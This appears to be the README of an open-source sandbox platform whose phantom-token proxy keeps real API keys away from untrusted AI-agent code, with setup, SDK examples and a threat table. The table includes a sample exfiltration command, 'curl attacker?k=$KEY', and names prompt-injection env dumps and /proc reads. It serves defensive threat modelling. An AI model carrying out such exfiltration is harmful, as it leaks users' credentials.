<p align="center">
  <img src="logo.svg" width="100" height="100" alt="agentjail platform">
</p>

<h1 align="center">agentjail platform</h1>

<p align="center">
  Phantom-token sandbox platform — open source, self-hosted.
</p>

---

The platform sits on top of the [agentjail](./README.md) sandbox engine
and adds everything you need to run untrusted AI-agent code *without ever
handing it a real API key*:

- **Phantom-token reverse proxy.** Sandboxes see random `phm_<64hex>`
  tokens and a `*_BASE_URL` pointing at a host-local proxy. The proxy
  swaps the phantom for the real key and streams the request upstream.
  Prompt injection, compromised packages, and generated code physically
  cannot exfiltrate credentials that are not in the jail.
- **Control plane.** Small HTTP API for attaching real keys, creating
  sessions (which return phantom env maps), and reading the audit log.
- **TypeScript SDK.** `@agentjail/sdk` — zero runtime deps.
- **Admin UI.** Next.js + React Server Components, ~24 small components,
  5 pages, none > 120 LOC.

## One-command local stack

```bash
export OPENAI_API_KEY=sk-...
export AGENTJAIL_API_KEY=aj_local_$(openssl rand -hex 16)

docker compose -f docker-compose.platform.yml up --build
```

Then:

- **Admin UI** — http://localhost:3000
- **Control plane API** — http://localhost:7000
- **Phantom proxy** — http://localhost:8443 *(only reachable from sandboxes)*

## Layout

```
crates/
  agentjail-phantom/   phantom-token reverse proxy (library)
  agentjail-ctl/       HTTP control plane (library)
  agentjail-server/    binary that runs both together
packages/sdk-node/     @agentjail/sdk — TypeScript client
web/                   Next.js admin dashboard
```

Every crate and package is usable standalone. Want just the phantom proxy
in front of your existing sandbox? Depend on `agentjail-phantom`. Want
the SDK without our control plane? Point it at any API that speaks the
same JSON shapes.

## Using it from an agent

```ts
import { Agentjail } from "@agentjail/sdk";
import { spawn } from "node:child_process";

const aj = new Agentjail({
  baseUrl: "http://localhost:7000",
  apiKey: process.env.AGENTJAIL_API_KEY!,
});

// One-time: store your real keys.
await aj.credentials.put({ service: "openai", secret: process.env.OPENAI_API_KEY! });
await aj.credentials.put({ service: "github", secret: process.env.GITHUB_TOKEN! });

// Per run: mint a session, hand its env to the sandbox.
const session = await aj.sessions.create({
  services: ["openai", "github"],
  scopes:   { github: ["/repos/my-org/*"] }, // optional path allowlist
  ttlSecs:  600,
});

spawn("node", ["agent.js"], {
  env: { ...process.env, ...session.env },
});
```

Inside `agent.js`:

```js
const r = await fetch(`${process.env.OPENAI_BASE_URL}/chat/completions`, {
  method: "POST",
  headers: {
    authorization: `Bearer ${process.env.OPENAI_API_KEY}`,  // phm_...
    "content-type": "application/json",
  },
  body: JSON.stringify({ model: "gpt-4o-mini", messages: [...] }),
});
```

The agent never sees `sk-...` — it only has `phm_<hex>`, which is
worthless off the proxy and dies when the session closes.

## Design principles

These are enforced; see `PLAN.md` §0 for the full list.

- **Composable** — every piece runs standalone
- **Reliable** — no unwraps, bounded limits, explicit timeouts, graceful shutdown
- **Well tested** — 73 automated tests, including an end-to-end wire test
- **Beautiful devex** — SDK is one import, errors name the fix
- **Lean docs** — ≤ 1 page per concept

## Tests

```bash
cargo test -p agentjail-phantom -p agentjail-ctl -p agentjail-server
( cd packages/sdk-node && npm test )
( cd web && npm run build )
```

## Security

The platform's job is to make credential exfiltration *physically
impossible*. Specifically:

| Attack                                  | What stops it                         |
|-----------------------------------------|---------------------------------------|
| Prompt-injection "print your env"       | env has `phm_`, not the real key      |
| Generated code `curl attacker?k=$KEY`   | phantom is useless off-proxy          |
| Compromised package reads `/proc/*/env` | same                                  |
| Memory-scraping exploit in the jail     | real key is not in jail memory        |
| Veth peer escape to proxy process       | proxy only stores active phantoms     |

Backstopped by the agentjail engine's own defences (namespaces, seccomp,
cgroups, landlock). See [README.md](./README.md) for those.
